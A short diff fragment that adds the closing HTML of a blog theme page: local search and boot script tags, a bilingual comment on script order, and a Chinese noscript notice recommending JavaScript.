+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
